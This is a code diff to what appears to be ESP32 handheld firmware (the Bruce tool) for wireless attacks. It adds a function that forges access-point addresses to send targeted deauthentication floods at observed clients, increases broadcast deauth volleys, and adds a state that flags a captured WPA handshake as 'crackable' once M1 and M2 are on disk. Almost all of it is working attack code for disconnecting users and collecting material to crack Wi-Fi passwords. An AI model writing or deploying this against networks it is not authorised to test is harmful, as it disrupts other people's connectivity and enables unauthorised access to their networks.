@@ -144,6 +144,19 @@ void send_raw_frame(const uint8_t *frame_buffer, int size) {
     }
 }
 
+void sendTargetedDeauthFrame(const uint8_t apBssid[6], const uint8_t client[6], uint8_t chan, int bursts) {
+    if (!apBssid || !client) return;
+    if (bursts < 1) bursts = 1;
+    if (bursts > 10) bursts = 10; // bounded: maximum the board can usefully push per volley
+    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
+    vTaskDelay(pdMS_TO_TICKS(5)); // let the radio settle on-channel
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    memcpy(&deauth_frame[4], client, 6);    // destination: the client
+    memcpy(&deauth_frame[10], apBssid, 6);  // source: forged AP
+    memcpy(&deauth_frame[16], apBssid, 6);  // BSSID: the AP
+    for (int i = 0; i < bursts; i++) { send_raw_frame(deauth_frame, sizeof(deauth_frame_default)); }
+}
+
 void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
     Serial.print("\nPreparing deauth frame to AP -> ");
     for (int j = 0; j < 6; j++) {
@@ -418,6 +431,7 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
     ap_record.primary = channel;
 
     String encryptionTypeStr = "Unknown";
+    bool deauthRisky = false; // SAE/PMF networks typically ignore deauth frames
     for (int i = 0; i < ap_records.size(); i++) {
         if (memcmp(ap_records[i].bssid, bssid_array, 6) == 0) {
             switch (ap_records[i].authmode) {
@@ -426,25 +440,38 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
                 case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                 case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                 case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
-                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
-                case WIFI_AUTH_WPA3_PSK: encryptionTypeStr = "WPA3/PSK"; break;
-                case WIFI_AUTH_WPA2_WPA3_PSK: encryptionTypeStr = "WPA2/WPA3/PSK"; break;
+                case WIFI_AUTH_WPA2_ENTERPRISE:
+                    encryptionTypeStr = "WPA2/Enterprise";
+                    deauthRisky = true;
+                    break;
+                case WIFI_AUTH_WPA3_PSK:
+                    encryptionTypeStr = "WPA3/PSK";
+                    deauthRisky = true;
+                    break;
+                case WIFI_AUTH_WPA2_WPA3_PSK:
+                    encryptionTypeStr = "WPA2/WPA3/PSK";
+                    deauthRisky = true;
+                    break;
                 default: encryptionTypeStr = "Unknown"; break;
             }
             break;
         }
     }
 
-    String sanitizedSsid = "";
-    for (size_t i = 0; i < tssid.length() && i < 32; ++i) {
+    // Stack buffer: no heap churn while sanitizing (embedded rule).
+    char ssidBuf[33];
+    size_t ssidLen = 0;
+    for (size_t i = 0; i < tssid.length() && ssidLen < 32; ++i) {
         char c = tssid[i];
         if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
             c == '_' || c == '.') {
-            sanitizedSsid += c;
+            ssidBuf[ssidLen++] = c;
         } else {
-            sanitizedSsid += '_';
+            ssidBuf[ssidLen++] = '_';
         }
     }
+    ssidBuf[ssidLen] = '\0';
+    String sanitizedSsid = String(ssidBuf);
     if (sanitizedSsid.length() == 0) {
         char bssidHex[32];
         sprintf(
@@ -515,22 +542,44 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
     unsigned long autoDeauthTimer = millis();
     unsigned long countdownTick = 0;
 
-    enum { SCANNING, MONITORING, CAPTURED } phase = SCANNING;
+    enum { SCANNING, MONITORING, CRACKABLE, CAPTURED } phase = SCANNING;
 
     bool needRedraw = true;
+    bool crackableAsked = false; // ask once when M1+M2 lands
+    unsigned long lastEapolSeen = 0;
 
     auto sendDeauthBurst = [&]() {
-        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
-        for (int i = 0; i < 5; i++) {
-            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-            vTaskDelay(10 / portTICK_PERIOD_MS);
+        // Prefer aimed deauths at observed clients (far more effective than
+        // broadcast); fall back to broadcast only when no client is known.
+        // Volley sizes are at the board's useful maximum: 8 bursts (24 air
+        // frames) per known client, 10 bursts broadcast.
+        uint64_t apKey = 0;
+        for (int i = 0; i < 6; i++) { apKey = (apKey << 8) | bssid_array[i]; }
+        uint8_t clients[3][6];
+        uint8_t nClients = sniffer_get_top_clients(apKey, clients, 3);
+        if (nClients > 0) {
+            for (uint8_t i = 0; i < nClients; i++) {
+                sendTargetedDeauthFrame(bssid_array, clients[i], channel, 8);
+            }
+            deauthCount += (int)nClients * 8 * 3;
+        } else {
+            wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
+            for (int i = 0; i < 10; i++) {
+                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                vTaskDelay(10 / portTICK_PERIOD_MS);
+            }
+            deauthCount += 10 * 3;
         }
-        deauthCount += 5;
         needRedraw = true;
         autoDeauthTimer = millis();
     };
 
-    auto deauthInterval = [&]() -> unsigned long { return (phase == SCANNING) ? 10000UL : 15000UL; };
+    auto deauthInterval = [&]() -> unsigned long {
+        // EAPOL flowing: back off and let the exchange complete instead of
+        // knocking clients down mid-handshake.
+        if (millis() - lastEapolSeen < 20000UL) return 20000UL;
+        return (phase == SCANNING) ? 10000UL : 15000UL;
+    };
 
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
     tft.setTextSize(FM);
@@ -545,11 +594,25 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
 
         if (num_EAPOL > prevNumEAPOL) {
             prevNumEAPOL = num_EAPOL;
+            lastEapolSeen = millis();
             needRedraw = true;
         }
 
         if (handshakeUsable(hsTracker)) {
             phase = CAPTURED;
+        } else if (handshakeCrackable(hsTracker)) {
+            phase = CRACKABLE;
+            if (!crackableAsked) {
+                crackableAsked = true;
+                // Default button is "Keep going": a held SEL key must never
+                // accidentally stop the capture.
+                int8_t choice = displayMessage(
+                    "M1 + M2 captured\nHandshake is crackable now.\nKeep capturing M3 + M4?", "Keep going",
+                    nullptr, "Stop", bruceConfig.priColor
+                );
+                needRedraw = true;
+                if (choice == 1) break; // M1+M2 already on disk; user is done
+            }
         } else if (hsTracker.msg1 && phase == SCANNING) {
             phase = MONITORING;
         }
@@ -566,10 +629,17 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel) 
             padprintln("SSID: " + tssid);
             padprintln("BSSID: " + mac);
             padprintln("Security: " + encryptionTypeStr);
+            if (deauthRisky) {
+                tft.setTextColor(TFT_ORANGE, bruceConfig.bgColor);
+                padprintln("Note: SAE/PMF may block deauth");
+            }
 
             if (phase == CAPTURED) {
                 tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                 padprintln("Status: CAPTURED!");
+            } else if (phase == CRACKABLE) {
+                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                padprintln("Status: CRACKABLE! (M1+M2)");
             } else if (hasBeacons) {
                 tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                 padprintln("Status: " + String(phase == MONITORING ? "Monitoring..." : "Scanning..."));
